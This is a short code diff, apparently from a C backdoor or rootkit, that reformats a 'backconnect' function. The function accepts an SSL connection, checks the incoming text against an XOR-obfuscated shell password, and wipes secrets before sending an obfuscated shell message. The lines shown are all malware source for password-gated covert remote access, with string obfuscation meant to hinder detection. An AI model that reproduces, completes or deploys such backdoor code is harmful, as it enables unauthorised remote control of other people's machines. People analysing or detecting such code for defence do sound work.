@@ -72,15 +72,11 @@ void backconnect(int sock)
     SSL_set_fd(ssl, sock);
     sock = SSL_get_fd(ssl);
 
-    if(SSL_accept(ssl) == -1)
-    {
-        exit(1);
-    }else{
-
+    if(SSL_accept(ssl) == -1) exit(1);
+    else{
         SSL_read(ssl, temp, sizeof(temp));
 
         char *shell_password = strdup(SHELL_PASSWORD); xor(shell_password);
-
         if(!strstr(temp, shell_password))
         {
             close(sock);
@@ -88,7 +84,6 @@ void backconnect(int sock)
             CLEAN(shell_password);
             return;
         }
-
         CLEAN(shell_password);
 
         char *shell_msg = strdup(SHELL_MSG); xor(shell_msg);
